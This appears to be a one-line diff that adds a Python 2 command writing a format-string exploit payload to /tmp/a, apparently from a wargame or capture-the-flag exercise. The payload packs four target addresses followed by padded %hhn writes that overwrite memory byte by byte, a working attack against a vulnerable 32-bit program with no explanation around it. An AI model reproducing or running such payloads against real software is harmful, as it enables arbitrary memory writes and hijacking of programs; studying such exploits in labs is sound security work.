@@ -1,0 +1,1 @@
+python -c 'print "8\x98\x04\x089\x98\x04\x08:\x98\x04\x08;\x98\x04\x08%148c%4$hhn%224c%5$hhn%128c%6$hhn%4c%7$hhn"' > /tmp/a
